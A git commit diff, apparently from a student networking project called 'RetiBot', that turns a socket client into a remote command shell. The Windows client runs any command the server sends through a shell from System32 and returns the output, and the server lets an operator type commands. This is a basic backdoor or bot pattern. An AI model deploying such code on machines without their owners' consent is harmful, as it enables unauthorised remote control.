3ade311c22c08d40c94365cbf9e00b7d7a447dc4
Gheovgos <72210745+Gheovgos@users.noreply.github.com>
2022-10-22 16:05:39 +0200

    si possono inviare comandi da terminale

--- RetiBot/client.py
+++ RetiBot/client.py
@@ -1,17 +1,23 @@
 from socket import *
 import os
+import subprocess
+
 
 serverName = 'localhost'
 serverPort = 120
+cmd = "cd C:\Windows\System32 && "
 clientSocket = socket(AF_INET, SOCK_STREAM)
 clientSocket.connect((serverName, serverPort))
-
 clientSocket.send(os.name.encode())
-print(os.name)
+print("In attesa di un input dal server..")
 
-modifiedSentence = clientSocket.recv(1024) #1024 grandezza dei byte
-f = os.system("cd C:\Windows\system32 && ipconfig")
+if os.name == 'nt':
+    while True:
+        data = clientSocket.recv(1024)  # 1024 grandezza dei byte
+        cmd += data.decode('utf-8')
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
+        out, err = proc.communicate()
+        clientSocket.send(out)
+        cmd = "cd C:\Windows\System32 && "
 
-
-print('From Server: ', modifiedSentence.decode()) #mostra il messaggio modificato dal server
 clientSocket.close()
--- RetiBot/server.py
+++ RetiBot/server.py
@@ -4,6 +4,7 @@ serverPort = 120
 serverSocket = socket(AF_INET, SOCK_STREAM) #AF inet intende IPv4 SOCK STREAM che TCP
 serverSocket.bind(('', serverPort)) #il primno parametro indica da chi puo' ricevere. Lasciato vuoto si intende che tutti possono connettersi
 serverSocket.listen(1)
+continua = True
 print("Il server e' pronto")
 while True:
 
@@ -15,8 +16,23 @@ while True:
         OS = "Windows"
     print("Sistema operativo in uso:", OS)
 
-    print()
+    while continua:
+        print("Inserisci comando di prompt:")
+        cmd = input()
+        connectionSocket.send(cmd.encode())  # manda il messaggio al client
+        out = connectionSocket.recv(1024).decode()
+        print(out)
+        print("Inserire un nuovo comando? [s\\n]: ")
+        yn = input()
+        while yn != "s" and yn != "n" and yn != "S" and yn != "N":
+            print("Input non valido, reinserire: ")
+            yn = input()
+        if yn == "s" or yn == "S":
+            continua = True
+        else:
+            print("Termino la connessione..")
+            connectionSocket.close()
+            continua = False
+            print("Connessione terminata.")
 
-    capitalizedSentence = OS.upper()
-    connectionSocket.send(capitalizedSentence.encode()) #manda il messaggio al client
-    connectionSocket.close()
+
